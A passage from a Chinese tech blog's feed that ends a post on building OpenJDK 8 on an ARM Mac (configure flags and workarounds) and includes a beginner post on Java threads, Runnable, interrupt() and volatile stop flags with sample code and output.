java version <span class="s2">"1.7.0_80"</span>
Java<span class="o">(</span>TM<span class="o">)</span> SE Runtime Environment <span class="o">(</span>build 1.7.0_80-b15<span class="o">)</span>
Java HotSpot<span class="o">(</span>TM<span class="o">)</span> 64-Bit Server VM <span class="o">(</span>build 24.80-b11, mixed mode<span class="o">)</span>
</code></pre></div></div>

<h4 id="执行配置文件校验命令">执行配置文件校验命令</h4>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sh configure <span class="nt">--with-freetype-include</span><span class="o">=</span>/opt/homebrew/opt/freetype/include/freetype2 <span class="nt">--with-freetype-lib</span><span class="o">=</span>/opt/homebrew/opt/freetype/lib <span class="nt">--disable-zip-debug-info</span> <span class="nt">--disable-debug-symbols</span> <span class="nt">--with-debug-level</span><span class="o">=</span>slowdebug <span class="nt">--with-boot-jdk</span><span class="o">=</span>/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home <span class="nt">--with-jvm-variants</span><span class="o">=</span>server
</code></pre></div></div>

<p>上面代码只需要修改一下<code class="language-plaintext highlighter-rouge">--with-freetype-include</code>、<code class="language-plaintext highlighter-rouge">--with-freetype-lib</code>、<code class="language-plaintext highlighter-rouge">--with-boot-jdk</code>的位置</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash ./configure --with-debug-level=slowdebug --with-freetype-include=/usr/local/Cellar/freetype/2.10.4/include/freetype2 --with-freetype-lib=/usr/local/Cellar/freetype/2.10.4/lib/ --with-boot-jdk=/Library/Java/JavaVirtualMachines/jdk1.8.0_261.jdk/Contents/Home --enable-debug-symbols
</code></pre></div></div>

<p><strong>出现的几个问题：</strong></p>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">Xcode 4 is required to build JDK 8, the version found was 11.0.</code></p>

    <p>修改	<code class="language-plaintext highlighter-rouge">common/autoconf/generated-configure.sh</code>，注释以下代码：</p>

    <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">XCODE_VERSION</span><span class="o">=</span><span class="sb">`</span><span class="nv">$XCODEBUILD</span> <span class="nt">-version</span> | <span class="nb">grep</span> <span class="s1">'^Xcode '</span> | <span class="nb">sed</span> <span class="s1">'s/Xcode //'</span><span class="sb">`</span>
<span class="nv">XC_VERSION_PARTS</span><span class="o">=(</span> <span class="k">${</span><span class="nv">XCODE_VERSION</span><span class="p">//./ </span><span class="k">}</span> <span class="o">)</span>
<span class="k">if </span><span class="nb">test</span> <span class="o">!</span> <span class="s2">"</span><span class="k">${</span><span class="nv">XC_VERSION_PARTS</span><span class="p">[0]</span><span class="k">}</span><span class="s2">"</span> <span class="o">=</span> <span class="s2">"4"</span><span class="p">;</span> <span class="k">then
  </span>as_fn_error <span class="nv">$?</span> <span class="s2">"Xcode 4 is required to build JDK 8, the version found was </span><span class="nv">$XCODE_VERSION</span><span class="s2">. Use --with-xcode-path to specify the location of Xcode 4 or make Xcode 4 active by using xcode-select."</span> <span class="s2">"</span><span class="nv">$LINENO</span><span class="s2">"</span> 5
<span class="k">fi</span>
</code></pre></div>    </div>
  </li>
  <li>
    <p>无法找到Xcode相关路径：</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>checking Determining Xcode SDK path... xcode-select: error: tool 'xcodebuild' requires Xcode, but active developer directory '/Library/Developer/CommandLineTools' is a command line tools instance
</code></pre></div>    </div>

    <p>执行：</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>xcode-select <span class="nt">-s</span> /Applications/Xcode.app/Contents/Developer
</code></pre></div>    </div>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">configure: error: A gcc compiler is required. Try setting --with-tools-dir.</code></p>

    <p>修改 <code class="language-plaintext highlighter-rouge">common/autoconf/generated-configure.sh</code>，注释以下代码，一共有两处</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ECHO</span> <span class="s2">"</span><span class="nv">$COMPILER_VERSION_OUTPUT</span><span class="s2">"</span> | <span class="nv">$GREP</span> <span class="s2">"Free Software Foundation"</span> <span class="o">&gt;</span> /dev/null
 <span class="c">#   if test $? -ne 0; then</span>
 <span class="c">#     { $as_echo "$as_me:${as_lineno-$LINENO}: The $COMPILER_NAME compiler (located as $COMPILER) does not seem to be the required $TOOLCHAIN_TYPE compiler." &gt;&amp;5</span>
<span class="c">#$as_echo "$as_me: The $COMPILER_NAME compiler (located as $COMPILER) does not seem to be the required $TOOLCHAIN_TYPE compiler." &gt;&amp;6;}</span>
 <span class="c">#     { $as_echo "$as_me:${as_lineno-$LINENO}: The result from running with --version was: \"$COMPILER_VERSION\"" &gt;&amp;5</span>
<span class="c">#$as_echo "$as_me: The result from running with --version was: \"$COMPILER_VERSION\"" &gt;&amp;6;}</span>
  <span class="c">#    as_fn_error $? "A $TOOLCHAIN_TYPE compiler is required. Try setting --with-tools-dir." "$LINENO" 5</span>
  <span class="c">#  fi</span>
</code></pre></div>    </div>
  </li>
</ul>

<p>如果出现以下界面，则说明成功</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/02/20220201122242.png" alt="image-20220201122242240" /></p>

<p>成功了个🔨，明明是64位，但是这里<strong>OpenJDK target</strong>却是检测的32位，我们修改一下config命令：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sh configure <span class="nt">--with-freetype-include</span><span class="o">=</span>/opt/homebrew/opt/freetype/include/freetype2 <span class="nt">--with-freetype-lib</span><span class="o">=</span>/opt/homebrew/opt/freetype/lib <span class="nt">--disable-zip-debug-info</span> <span class="nt">--disable-debug-symbols</span> <span class="nt">--with-debug-level</span><span class="o">=</span>slowdebug <span class="nt">--with-boot-jdk</span><span class="o">=</span>/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home <span class="nt">--with-jvm-variants</span><span class="o">=</span>server <span class="nt">--with-target-bits</span><span class="o">=</span>64
</code></pre></div></div>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">configure: error: It is not possible to use --with-target-bits=64 on a 32 bit system.</code></p>

    <p>新的报错，看来还是openjdk对arm系统不太兼容，我们在<code class="language-plaintext highlighter-rouge">common/autoconf/generated-configure.sh</code>重新搜索一下报错语句，强制加上</p>

    <p><code class="language-plaintext highlighter-rouge">OPENJDK_TARGET_CPU_BITS=64</code></p>
  </li>
</ul>

<p>终于ok了</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/02/20220201123337.png" alt="image-20220201123337750" /></p>

<h3 id="开始编译放弃了">开始编译(放弃了)</h3>

<p>执行<code class="language-plaintext highlighter-rouge">compiledb make WARNINGS_ARE_ERRORS="" CONF=macosx-arm-normal-server-slowdebug all </code>开始编译</p>

<p>注意：每次编译失败，都需要以下两个命令重新编译</p>

<ol>
  <li><code class="language-plaintext highlighter-rouge">compiledb make CONF=macosx-arm-normal-server-slowdebug clean</code></li>
  <li><code class="language-plaintext highlighter-rouge">compiledb make WARNINGS_ARE_ERRORS="" CONF=macosx-arm-normal-server-slowdebug all</code></li>
</ol>

<p>可能出现的问题：</p>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">ld: library not found for -lstdc++</code></p>

    <p>下载<code class="language-plaintext highlighter-rouge">git clone https://github.com/quantum6/xcode-missing-libstdcpp</code>，进入工具执行<code class="language-plaintext highlighter-rouge">sh install.sh</code>，这是一个软连接命令，在macos高版本为了安全对软连接目录作了限制，我们可以对链接的文件目录做替换即可。</p>
  </li>
  <li>
    <p>……</p>
  </li>
  <li>
    <p>……</p>
  </li>
  <li>
    <p>还有一大堆问题，m1，🐶都不用</p>
  </li>
</ul>

<h2 id="参考">参考</h2>

<ul>
  <li><a href="https://book.douban.com/subject/34907497/">《 深入理解Java虚拟机 》</a></li>
  <li><a href="https://book.douban.com/subject/26802084/">《 自己动手写Java虚拟机 》</a></li>
  <li><a href="https://docs.oracle.com/javase/specs/jvms/se8/html/">Java虚拟机规范</a></li>
  <li><a href="https://tech.meituan.com/2019/09/05/java-bytecode-enhancement.html">字节码增强技术探索</a></li>
  <li><a href="https://fynch3r.github.io/ASM%E7%AC%94%E8%AE%B0/">fynch3r ASM笔记</a></li>
</ul>]]></content><author><name>Theoyu</name><email>zeyu.ou@foxmail.com</email></author><summary type="html"><![CDATA[第一部分，我们简单谈一谈jvm解释执行的依据；第二部分关于字节码，也算是对《深入理解Java虚拟机》一书的实践；最后会简单介绍两种字节码操作框架，以实现字节码插桩。]]></summary></entry><entry><title type="html">简单学习java并发</title><link href="http://localhost:4000/2022/01/04/concurrent-in-java.html" rel="alternate" type="text/html" title="简单学习java并发" /><published>2022-01-04T21:30:20+08:00</published><updated>2022-01-04T21:30:20+08:00</updated><id>http://localhost:4000/2022/01/04/concurrent-in-java</id><content type="html" xml:base="http://localhost:4000/2022/01/04/concurrent-in-java.html"><![CDATA[<!--more-->

<h2 id="如何创建线程">如何创建线程</h2>

<p>首先聊一下java线程和go协程的不同之处</p>

<p>在golang中，通过go关键字开启一个协程，执行匿名函数中的内容，此时main函数需要处于休眠模式下等待协程的运行，因为对golang而言，<strong>main函数线程结束则整个进程就结束了</strong>。</p>

<p>java分用户线程和守护线程（Daemon Thread）两个概念，其中main函数也是用户线程，<strong>只有当所有用户线程退出时，jvm进程才会结束</strong>。</p>

<h3 id="threat">Threat</h3>

<p>使用Threat创建线程的方法</p>

<ol>
  <li>定义Threat类的子类，并重写该类的<code class="language-plaintext highlighter-rouge">run()</code>方法。</li>
  <li>创建Threat类的实例，即创建线程对象。</li>
  <li>调用对象的<code class="language-plaintext highlighter-rouge">start()</code>方法启动该线程。</li>
</ol>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">package</span> <span class="nn">com.theoyu.concurrency</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">ThreadDemo</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">Thread</span> <span class="n">thread1</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">MyThread</span><span class="o">(</span><span class="s">"Thread-1"</span><span class="o">);</span>
        <span class="nc">Thread</span> <span class="n">thread2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">MyThread</span><span class="o">(</span><span class="s">"Thread-2"</span><span class="o">);</span>
        <span class="n">thread1</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
        <span class="n">thread2</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
    <span class="o">}</span>
    <span class="kd">static</span> <span class="kd">class</span> <span class="nc">MyThread</span> <span class="kd">extends</span> <span class="nc">Thread</span> <span class="o">{</span>
        <span class="kd">public</span> <span class="nf">MyThread</span><span class="o">(</span><span class="nc">String</span> <span class="n">name</span><span class="o">){</span>
            <span class="kd">super</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="kd">private</span> <span class="kt">int</span> <span class="n">ticket</span> <span class="o">=</span><span class="mi">3</span> <span class="o">;</span>

        <span class="nd">@Override</span>
        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
            <span class="k">while</span> <span class="o">(</span><span class="n">ticket</span><span class="o">&gt;</span><span class="mi">0</span><span class="o">){</span>
                <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="nc">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getName</span><span class="o">()+</span><span class="s">" 卖出了第 "</span><span class="o">+</span><span class="n">ticket</span><span class="o">+</span><span class="s">" 张票 "</span><span class="o">);</span>
                <span class="k">try</span> <span class="o">{</span>
                    <span class="nc">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="mi">100</span><span class="o">);</span>
                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">InterruptedException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
                    <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
                <span class="o">}</span>
                <span class="n">ticket</span><span class="o">--;</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>

</code></pre></div></div>

<p>输出：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Thread-1 卖出了第 3 张票 
Thread-2 卖出了第 3 张票 
Thread-1 卖出了第 2 张票 
Thread-2 卖出了第 2 张票 
Thread-1 卖出了第 1 张票 
Thread-2 卖出了第 1 张票
</code></pre></div></div>

<h3 id="runnable">Runnable</h3>

<p>从Threat类的构造函数我们可以看到这样的重载</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/01/20220105162232.png" alt="image-20220105162232683" /></p>

<p>其中第三个重载，也就是传入Runnable接口</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/01/20220105162449.png" alt="image-20220105162449529" /></p>

<p>其实Threat本身也就是实现了Runnable，不过提供了更多的功能而已。</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">package</span> <span class="nn">com.theoyu.concurrency</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">RunnableDemo</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">Thread</span> <span class="n">thread1</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Thread</span><span class="o">(</span><span class="k">new</span> <span class="nc">MyThread</span><span class="o">(),</span><span class="s">"Thread-1"</span><span class="o">);</span>
        <span class="nc">Thread</span> <span class="n">thread2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Thread</span><span class="o">(</span><span class="k">new</span> <span class="nc">MyThread</span><span class="o">(),</span><span class="s">"Thread-2"</span><span class="o">);</span>
        <span class="n">thread1</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
        <span class="n">thread2</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
    <span class="o">}</span>
    <span class="kd">static</span> <span class="kd">class</span> <span class="nc">MyThread</span> <span class="kd">implements</span> <span class="nc">Runnable</span> <span class="o">{</span>
        <span class="kd">private</span> <span class="kt">int</span> <span class="n">ticket</span> <span class="o">=</span> <span class="mi">3</span><span class="o">;</span>

        <span class="nd">@Override</span>
        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
            <span class="k">while</span> <span class="o">(</span><span class="n">ticket</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
                <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="nc">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getName</span><span class="o">()</span> <span class="o">+</span> <span class="s">" 卖出了第 "</span> <span class="o">+</span> <span class="n">ticket</span> <span class="o">+</span> <span class="s">" 张票 "</span><span class="o">);</span>
                <span class="k">try</span> <span class="o">{</span>
                    <span class="nc">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="mi">100</span><span class="o">);</span>
                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">InterruptedException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
                    <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
                <span class="o">}</span>
                <span class="n">ticket</span><span class="o">--;</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>

</code></pre></div></div>

<p>在第一个方法里，我们理解为子类重写了父类的方法，那么在Runnable中，是怎么执行到其重写的run方法呢？</p>

<p>在<code class="language-plaintext highlighter-rouge">start()</code>方法里，我们可以看见重写的<code class="language-plaintext highlighter-rouge">run()</code>方法，这里对target(Runnable)进行了判断，于是乎就走到了target.run()中。</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@Override</span>
<span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">target</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">target</span><span class="o">.</span><span class="na">run</span><span class="o">();</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p>这里谈一下<code class="language-plaintext highlighter-rouge">start()</code>和<code class="language-plaintext highlighter-rouge">run()</code>的区别，在第一个方法中，如果我们把threat1的start改为run，会怎么样呢？</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">package</span> <span class="nn">com.theoyu.concurrency</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">ThreadDemo</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">Thread</span> <span class="n">thread1</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">MyThread</span><span class="o">(</span><span class="s">"Thread-1"</span><span class="o">);</span>
        <span class="nc">Thread</span> <span class="n">thread2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">MyThread</span><span class="o">(</span><span class="s">"Thread-2"</span><span class="o">);</span>
        <span class="n">thread1</span><span class="o">.</span><span class="na">run</span><span class="o">();</span>
        <span class="n">thread2</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
    <span class="o">}</span>
    <span class="kd">static</span> <span class="kd">class</span> <span class="nc">MyThread</span> <span class="kd">extends</span> <span class="nc">Thread</span> <span class="o">{</span>
        <span class="kd">public</span> <span class="nf">MyThread</span><span class="o">(</span><span class="nc">String</span> <span class="n">name</span><span class="o">){</span>
            <span class="kd">super</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="kd">private</span> <span class="kt">int</span> <span class="n">ticket</span> <span class="o">=</span><span class="mi">3</span> <span class="o">;</span>

        <span class="nd">@Override</span>
        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
            <span class="k">while</span> <span class="o">(</span><span class="n">ticket</span><span class="o">&gt;</span><span class="mi">0</span><span class="o">){</span>
                <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="nc">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getName</span><span class="o">()+</span><span class="s">" 卖出了第 "</span><span class="o">+</span><span class="n">ticket</span><span class="o">+</span><span class="s">" 张票 "</span><span class="o">);</span>
                <span class="k">try</span> <span class="o">{</span>
                    <span class="nc">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="mi">100</span><span class="o">);</span>
                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">InterruptedException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
                    <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
                <span class="o">}</span>
                <span class="n">ticket</span><span class="o">--;</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>

</code></pre></div></div>

<p>结果：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>main 卖出了第 3 张票 
main 卖出了第 2 张票 
main 卖出了第 1 张票 
Thread-2 卖出了第 3 张票 
Thread-2 卖出了第 2 张票 
Thread-2 卖出了第 1 张票 
</code></pre></div></div>

<p>可以看到<code class="language-plaintext highlighter-rouge">thread1.run()</code>并没有开启新的线程，相当于只是在main线程中执行了一个普通方法，具体创建线程的函数在<code class="language-plaintext highlighter-rouge">start()</code>的<code class="language-plaintext highlighter-rouge">private native void start0()</code>中,所以必须使用<code class="language-plaintext highlighter-rouge">start()</code>启动线程，jvm让这个线程去执行<code class="language-plaintext highlighter-rouge">run()</code>方法。</p>

<h2 id="线程的基础用法">线程的基础用法</h2>

<h3 id="线程休眠">线程休眠</h3>

<p><code class="language-plaintext highlighter-rouge">Thread.sleep</code>,这个没什么好说的，但注意<code class="language-plaintext highlighter-rouge">Thread.sleep</code>可能会抛出  <code class="language-plaintext highlighter-rouge">InterruptedException</code>，java线程的异常必须在该线程中处理。</p>

<h3 id="中断线程">中断线程</h3>

<p>回想在go中，如何通知一个协程关闭呢？<a href="https://theoyu.top/posts/concurrent-in-go/#%E9%80%80%E5%87%BA%E5%8D%8F%E7%A8%8B%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F">golang退出协程的几种方式</a></p>

<p>之前提到了go不推荐用共享全局变量的方式进行数据交互，但在java中恰好相反，简单来说安全地终止线程，java有以下两种方式：</p>

<ul>
  <li>
    <p>对目标线程使用<code class="language-plaintext highlighter-rouge">interrupt()</code>方法配合线程中的检测退出。</p>
  </li>
  <li>
    <p>使用<code class="language-plaintext highlighter-rouge">volatile </code>关键字，在<code class="language-plaintext highlighter-rouge">run</code>方法中配合退出。</p>

    <p>先看看第一种方式，只要在其他线程中对目标线程使用<code class="language-plaintext highlighter-rouge">interrupt()</code>方法，目标线程只需检查自身的interrupted状态，即可控制退出：</p>
  </li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">package</span> <span class="nn">com.theoyu.concurrency.foundation</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">InterruptDemo1</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">InterruptedException</span> <span class="o">{</span>
        <span class="nc">Thread</span> <span class="n">t</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">MyThread</span><span class="o">();</span>
        <span class="n">t</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
        <span class="nc">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="mi">1</span><span class="o">);</span> 
        <span class="n">t</span><span class="o">.</span><span class="na">interrupt</span><span class="o">();</span> 
        <span class="n">t</span><span class="o">.</span><span class="na">join</span><span class="o">();</span> 
        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"end"</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="kd">static</span> <span class="kd">class</span> <span class="nc">MyThread</span> <span class="kd">extends</span> <span class="nc">Thread</span> <span class="o">{</span>
        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
            <span class="kt">int</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
            <span class="k">while</span> <span class="o">(!</span> <span class="n">isInterrupted</span><span class="o">())</span> <span class="o">{</span>
                <span class="n">n</span> <span class="o">++;</span>
                <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">n</span> <span class="o">+</span> <span class="s">" hello!"</span><span class="o">);</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span>

<span class="o">}</span>
</code></pre></div></div>

<p>这里在<code class="language-plaintext highlighter-rouge">run()</code>方法的while循环中持续监测<code class="language-plaintext highlighter-rouge">isInterrupted()</code>状态，在main线程休眠1毫秒后，对目标线程发送信号，退出while循环结束<code class="language-plaintext highlighter-rouge">run()</code> 方法</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
...
106 hello!
107 hello!
108 hello!
end
</code></pre></div></div>

<p>其实，<code class="language-plaintext highlighter-rouge">interrupt()</code>只是向目标线程发送了“中断请求”，至于目标线程能不能退出，还得看具体代码实现。</p>

<p>如果目标线程处于等待状态，对其发送“中断请求”则会抛出<code class="language-plaintext highlighter-rouge">InterruptedException</code>异常，此时只需处理异常并退出即可</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">package</span> <span class="nn">com.theoyu.concurrency.foundation</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">InterruptDemo2</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">InterruptedException</span> <span class="o">{</span>
        <span class="nc">Thread</span> <span class="n">t</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">InterruptDemo2</span><span class="o">.</span><span class="na">MyThread</span><span class="o">();</span>
        <span class="n">t</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
        <span class="n">t</span><span class="o">.</span><span class="na">interrupt</span><span class="o">();</span>
        <span class="n">t</span><span class="o">.</span><span class="na">join</span><span class="o">();</span>
        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"end"</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="kd">static</span> <span class="kd">class</span> <span class="nc">MyThread</span> <span class="kd">extends</span> <span class="nc">Thread</span> <span class="o">{</span>
        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
            <span class="kt">int</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
            <span class="k">try</span> <span class="o">{</span>
                <span class="nc">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="mi">1000</span><span class="o">*</span><span class="mi">10</span><span class="o">);</span>
            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">InterruptedException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
                <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"线程 "</span><span class="o">+</span><span class="n">currentThread</span><span class="o">().</span><span class="na">getName</span><span class="o">()+</span><span class="s">" 线程休眠被终止"</span><span class="o">);</span>
                <span class="k">return</span><span class="o">;</span>
            <span class="o">}</span>
            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"线程 "</span><span class="o">+</span><span class="n">currentThread</span><span class="o">().</span><span class="na">getName</span><span class="o">()+</span><span class="s">" 正常结束"</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>

<span class="o">}</span>

</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>线程 Thread-0 线程休眠被终止
end
</code></pre></div></div>

<p>再来看看另外一种使用关键字的方法退出</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">package</span> <span class="nn">com.theoyu.concurrency.foundation</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">VolatileDemo</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">InterruptedException</span> <span class="o">{</span>
        <span class="nc">MyThread</span> <span class="n">t</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">MyThread</span><span class="o">();</span>
        <span class="n">t</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
        <span class="nc">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="mi">1</span><span class="o">);</span>
        <span class="n">t</span><span class="o">.</span><span class="na">running</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span> <span class="c1">// 标志位置为false</span>
    <span class="o">}</span>

    <span class="kd">static</span> <span class="kd">class</span> <span class="nc">MyThread</span> <span class="kd">extends</span> <span class="nc">Thread</span> <span class="o">{</span>
        <span class="kd">public</span> <span class="kd">volatile</span> <span class="kt">boolean</span> <span class="n">running</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
            <span class="kt">int</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
            <span class="k">while</span> <span class="o">(</span><span class="n">running</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">n</span><span class="o">++;</span>
                <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">n</span> <span class="o">+</span> <span class="s">" hello!"</span><span class="o">);</span>
            <span class="o">}</span>
            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"end!"</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
...
135 hello!
136 hello!
end!
</code></pre></div></div>

<h3 id="线程礼让">线程礼让</h3>

